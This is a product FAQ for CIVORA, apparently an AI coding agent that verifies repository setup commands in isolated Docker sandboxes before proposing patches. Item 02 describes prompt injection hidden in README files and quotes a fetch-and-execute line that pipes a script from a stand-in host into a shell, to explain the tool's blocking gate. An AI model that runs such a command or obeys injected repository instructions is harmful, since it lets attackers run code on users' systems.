05 // TECHNICAL SPECIFICATIONS

Frequently Asked Questions

Architecture, sandboxing boundaries, and cryptographic safety protocols.

01. How does CIVORA differ from standard coding agents like Copilot or Claude Code?
+
Standard coding agents generate text diffs based on token probability without physically verifying whether the setup commands actually work. CIVORA never trusts unverified code: it spawns a pristine Docker container, executes instructions, discovers hidden environment discrepancies, proves counterfactual candidate interventions, and only commits patches verified with physical exit code 0.
02. How does the Zero-Trust Gate prevent prompt injections in open-source repos?
+
Malicious actors can hide prompt injection payloads inside README files (e.g. curl -s https://evil.sh | sh). CIVORA uses an HMAC SHA-256 Provenance Registry. Any patch suggested by the model MUST match an intervention candidate previously proved inside the isolated sandbox. Unverified commands are immediately blocked and flagged with security alerts before a PR can ever be created.
03. Does CIVORA execute repository instructions on my host machine?
+
No. All candidate executions occur within ephemeral, rootless Docker sandboxes (debian:bookworm-slim) with no host directory mounts, read-only repository snapshots, network isolation options, and resource quotas. Your local machine and production servers are completely protected.
04. What GitHub App permissions does CIVORA require?
+
CIVORA follows the principle of least privilege. Its Model Context Protocol (MCP) server enforces strictly read-only access (repo_get_metadata, repo_list_tree, repo_read_file, ci_get_workflows, ci_get_check_runs). All read operations pass through automated regex secret redaction to ensure credentials never leak.
05. How does CIVORA synthesize verified Devcontainers (.devcontainer.json)?
+
Upon reaching Stage 07 clean-room verification, CIVORA records the exact runtime environment (Python 3.13, Node 20, Debian Bookworm, hash-locked dependencies) and synthesizes a production-grade .devcontainer.json with postCreateCommand hooks, recommended extensions, and forwarded ports so new contributors can onboard in 1 click.
